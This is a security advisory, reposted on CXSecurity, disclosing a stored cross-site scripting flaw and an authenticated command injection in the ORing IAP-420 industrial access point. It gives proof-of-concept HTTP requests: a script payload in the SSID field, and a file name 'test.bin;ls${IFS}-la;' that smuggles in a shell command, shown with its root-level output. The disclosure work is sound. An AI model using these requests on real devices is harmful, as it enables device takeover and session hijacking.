---
title: ORing IAP-420 2.01e Cross Site Scripting / Command Injection
url: https://cxsecurity.com/issue/WLB-2024060003
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-03
fetch_date: 2025-10-06T17:31:43.591015
---

# ORing IAP-420 2.01e Cross Site Scripting / Command Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ORing IAP-420 2.01e Cross Site Scripting / Command Injection** **2024.06.02**  Credit:  **[T. Weber](https://cxsecurity.com/author/T.%2BWeber/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-5411](https://cxsecurity.com/cveshow/CVE-2024-5411/ "Click to see CVE-2024-5411")** | **[CVE-2024-5410](https://cxsecurity.com/cveshow/CVE-2024-5410/ "Click to see CVE-2024-5410")**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")  [CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

CyberDanube Security Research 20240528-0
-------------------------------------------------------------------------------
title| Multiple Vulnerabilities
product| ORing IAP-420
vulnerable version| 2.01e
fixed version| -
CVE number| CVE-2024-5410, CVE-2024-5411
impact| High
homepage| https://oringnet.com/
found| 2024-01-19
by| T. Weber (Office Vienna)
| CyberDanube Security Research
| Vienna | St. Plten
|
| https://www.cyberdanube.com
-------------------------------------------------------------------------------
Vendor description
-------------------------------------------------------------------------------
"Founded in 2005, ORing specializes in developing innovative own-branded
products for industrial settings. Over the years, ORing has accumulated
abundant experience in wired and wireless network communications industry. In
line with the commercialization of 5G, ORing has stretched its arm into the
IIoT field, helping customers realize all kinds of IIoT applications such as
smart manufacturing, smart city, and industrial automation. With high product
quality and best customer services in mind, ORing has continued to launch
cutting-edge products catering to customer needs. ORing's products have been
widely adopted in surveillance, rail transport, industrial automation, power
substations, renewable energy, and marine industries with offices worldwide to
address customer needs in real time."
Source: https://oringnet.com/en/about-us/company-profile
Vulnerable versions
-------------------------------------------------------------------------------
IAP-420 / 2.01e
Vulnerability overview
-------------------------------------------------------------------------------
1) Stored Cross-Site Scripting (CVE-2024-5410)
A Stored Cross-Site Scripting vulnerability was identified in the web interface
of the device. The SSID of the WiFi can be configured to contain arbitrary
JavaScript code. An attacker can exploit this vulnerability by luring a victim
to visit a malicious website. Furthermore, it is possible to hijack the session
of the attacked user.
2) Authenticated Command Injection (CVE-2024-5411)
The filename parameter of the config file upload is prone to a Command
Injection vulnerability. This vulnerability can only be exploited if a user is
authenticated to the web interface. This way, an attacker can invoke commands
and is able to get full control over the whole device.
Proof of Concept
-------------------------------------------------------------------------------
1) Stored Cross-Site Scripting (CVE-2024-5410)
Stored Cross-Site Scripting can be triggered by placing JavaScript code into
the SSID input field of the web interface as authenticated user. A single
request for injecting the script is shown below:
-------------------------------------------------------------------------------
POST /cgi-bin/wl\_set.cgi HTTP/1.1
Host: 192.168.0.1
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 659
Connection: keep-alive
Cookie: auth=YWRtaW46YWRtaW4=
Upgrade-Insecure-Requests: 1
sel\_op\_mode=client&sel\_mssid=0&tf\_ssid=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&sel\_isolation=0&
sel\_mssid\_isolation=0&sel\_auth\_mode=0&rb\_wep\_authmode=0&sel\_wep\_enc\_bits=0&
sel\_wep\_key\_type=0&tf\_key1=&tf\_key2=&tf\_key3=&tf\_key4=&rb\_wpapsk\_authmode=0&
rb\_wpapsk\_enc=0&tf\_wpa\_key=&rb\_wpa\_authmode=0&rb\_wpa\_enc=0&tf\_ip1=&tf\_ip2=&
tf\_ip3=&tf\_ip4=&tf\_radius\_port=&tf\_radius\_key=&tf\_ip1\_1x=&tf\_ip2\_1x=&
tf\_ip3\_1x=&tf\_ip4\_1x=&tf\_radius\_port\_1x=&tf\_radius\_key\_1x=&bt\_save=Save&
lang=en&channel=0&isolation=0&mssid\_isolation=0&auth\_mode=0&wep\_authmode=0&
wpapsk\_authmode=0&wpa\_authmode=0&wpa\_enc\_type=0&wep\_enc\_bits=0&wep\_key\_type=0&
wep\_key\_index=0&ret\_msg=
-------------------------------------------------------------------------------
2) Authenticated Command Injection (CVE-2024-5411)
A command can be injected in the filename of the uploaded config. By sending a
request as shown below, the content of the current directory can be shown:
-------------------------------------------------------------------------------
POST /cgi-bin/admin\_config.cgi?todo=upconf HTTP/1.1
Host: 10.69.10.2
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------347087158737672164432057801583
Content-Length: 563
Connection: keep-alive
Cookie: auth=YWRtaW46YWRtaW4=
Upgrade-Insecure-Requests: 1
-----------------------------347087158737672164432057801583
Content-Disposition: form-data; name="upfile"; filename="test.bin;ls${IFS}-la;"
-----------------------------347087158737672164432057801583
Content-Disposition: form-data; name="bt\_upconf"
Upload
-----------------------------347087158737672164432057801583
Content-Disposition: form-data; name="lang"
en
-----------------------------347087158737672164432057801583
Content-Disposition: form-data; name="ret\_msg\_upconf"
-----------------------------347087158737672164432057801583--
-------------------------------------------------------------------------------
This request is equal to executing "ls -la" on the console of the device.
-------------------------------------------------------------------------------
HTTP/1.0 200 OK
tar: can't open '/tmp/test.bin': No such file or directory
drwxr-xr-x 4 root root 1024 Mar 7 ...